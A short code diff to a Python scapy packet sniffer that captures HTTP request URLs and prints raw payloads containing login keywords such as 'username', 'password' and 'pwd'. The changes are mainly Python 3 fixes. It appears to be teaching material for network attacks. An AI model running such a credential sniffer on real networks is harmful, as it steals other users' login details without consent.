@@ -12,19 +12,18 @@ def get_url(packet):
 
 def get_login_info(packet):
 	if packet.haslayer(sc.Raw):
-                        load = packet[sc.Raw].load
-                        keywords = ["username", "Username", "login", "password", "Password",
-					"Uname", "uname", "pwd", "PWD", "Pwd"]
-                        for keyword in keywords:
-                                if keyword in load:
-					return load
+		load = str(packet[sc.Raw].load)
+		keywords = ["username", "Username", "login", "password", "Password", "Uname", "uname", "pwd", "PWD", "Pwd"]
+		for k in keywords:
+			if k in load:
+				return load
 
 def process_packet(packet):
 	if packet.haslayer(http.HTTPRequest):
 		#print(packet.show())
 		url = get_url(packet)
 		print("[+] URLS: ============================================")
-		print(url)
+		print(url.decode())
 		load_layer = get_login_info(packet)
 		if load_layer:
 			print("\n\n[+] Possible Usernames and Passwords: =======")
